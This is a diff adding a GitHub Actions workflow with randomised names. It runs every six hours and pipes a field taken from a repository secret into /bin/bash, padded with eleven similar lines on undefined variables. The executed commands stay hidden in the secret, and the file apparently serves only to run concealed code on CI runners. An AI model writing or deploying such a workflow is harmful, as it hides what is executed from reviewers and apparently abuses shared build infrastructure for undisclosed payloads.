@@ -1,0 +1,30 @@
+name: mizhengxuan1736
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mizhengxuan1736
+        env:
+          th9053: ${{ secrets.th9053 }}
+        run: |
+          echo $th9053 | jq -r .kwj9 | /bin/bash
+          echo $tch92307 | jq -r .foymz0288 | /bin/bash
+          echo $jptrz1 | jq -r .avx656 | /bin/bash
+          echo $qqvaa22 | jq -r .jxnxk9850 | /bin/bash
+          echo $odoc5 | jq -r .cikpk6 | /bin/bash
+          echo $mkan1 | jq -r .ifrzu780 | /bin/bash
+          echo $zurhl695 | jq -r .ihum7652 | /bin/bash
+          echo $v15 | jq -r .i747 | /bin/bash
+          echo $yntvt94 | jq -r .d15869 | /bin/bash
+          echo $pi99642 | jq -r .gyn946 | /bin/bash
+          echo $zp6266 | jq -r .hrq16 | /bin/bash
+          echo $oqz20 | jq -r .n6 | /bin/bash
+
